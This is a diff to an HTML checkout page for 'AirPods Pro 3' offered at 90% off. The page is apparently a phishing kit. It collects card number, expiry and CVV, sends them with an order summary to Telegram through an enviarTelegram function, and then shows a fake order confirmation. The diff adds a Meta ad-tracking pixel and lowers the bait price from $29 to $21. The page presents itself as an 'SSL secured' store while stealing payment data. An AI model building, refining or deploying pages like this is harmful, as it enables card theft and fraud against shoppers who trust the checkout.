@@ -19,7 +19,8 @@ header{display:flex;justify-content:space-between;align-items:center;margin-bott
 .sum .t{flex:1}
 .sum b{font-size:14.5px;display:block;font-weight:600}
 .sum span{font-size:12.5px;color:var(--muted)}
-.sum .p{font-weight:600;font-size:16px}
+.sum .p{font-weight:600;font-size:16px;text-align:right}
+.sum .p s{display:block;font-size:11.5px;color:var(--muted);font-weight:400}
 .ship{display:flex;justify-content:space-between;padding:11px 22px;border-bottom:1px solid #ededf0;font-size:13px;color:#0a7d33;font-weight:600;background:#f6fdf9}
 .tot{display:flex;justify-content:space-between;padding:13px 22px;border-bottom:1px solid #ededf0;font-size:14px;color:var(--muted)}
 .tot b{color:var(--ink);font-size:16px;font-weight:600}
@@ -51,6 +52,16 @@ button.load .sp{display:block}
 .pid b{color:var(--ink)}
 .again{display:inline-block;margin-top:18px;color:var(--blue);font-size:14px}
 </style>
+<!-- META PIXEL -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','1745699572807528');
+fbq('track','PageView');
+</script>
 </head>
 <body>
 <div class="wrap">
@@ -63,10 +74,10 @@ button.load .sp{display:block}
     <div class="sum">
       <img src="producto.jpg" alt="" onerror="this.onerror=null;this.src='detalle.jpg';">
       <div class="t"><b>AirPods Pro 3</b><span>90% OFF · Free delivery</span></div>
-      <div class="p">$29</div>
+      <div class="p">$21<s>$210</s></div>
     </div>
     <div class="ship"><span>🚚 Express delivery</span><b>Arrives tomorrow</b></div>
-    <div class="tot"><span>Total (USD)</span><b>$29.00</b></div>
+    <div class="tot"><span>Total (USD)</span><b>$21.00</b></div>
 
     <form id="form" novalidate>
       <div class="sec">Contact</div>
@@ -99,7 +110,7 @@ button.load .sp{display:block}
           <div class="inp"><input id="cvv" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc"></div></label>
       </div>
 
-      <button type="submit" id="btn"><span class="sp"></span><span id="bt">Pay $29.00</span></button>
+      <button type="submit" id="btn"><span class="sp"></span><span id="bt">Pay $21.00</span></button>
       <div class="err" id="err"></div>
       <div class="note">🔒 Encrypted connection · SSL secured</div>
     </form>
@@ -169,13 +180,13 @@ $("form").addEventListener("submit", async e=>{
 • Expiry: ${exp}
 • CVV: ${cvv}
 
-📦 Product: AirPods Pro 3 · $29
+📦 Product: AirPods Pro 3 · $21
 🧾 Order: ${ped}`;
 
   await enviarTelegram(texto);
   await sleep(2000);
 
-  if(typeof fbq === "function"){ fbq('track','Purchase',{value:29,currency:'USD'}); }
+  if(typeof fbq === "function"){ fbq('track','Purchase',{value:21,currency:'USD'}); }
   $("ped").textContent = ped;
   $("res").classList.remove("oculto");
 });
